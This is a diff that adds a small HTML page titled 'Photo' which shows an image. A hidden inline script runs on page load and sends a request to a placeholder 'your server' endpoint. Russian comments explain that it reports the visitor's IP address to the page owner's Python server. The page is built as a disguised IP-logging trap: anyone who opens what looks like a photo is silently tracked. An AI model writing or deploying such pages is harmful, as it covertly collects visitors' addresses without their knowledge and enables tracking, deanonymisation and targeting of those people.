@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Photo</title>
+</head>
+<body>
+    <img src="photo.jpg" alt="Photo">
+    
+    <script>
+        // Отправляем IP на ваш Python сервер
+        fetch('http://ваш_сервер:5000/api/ip')
+            .then(r => r.json())
+            .then(data => {
+                console.log('IP отправлен на проверку');
+            });
+    </script>
+</body>
+</html>
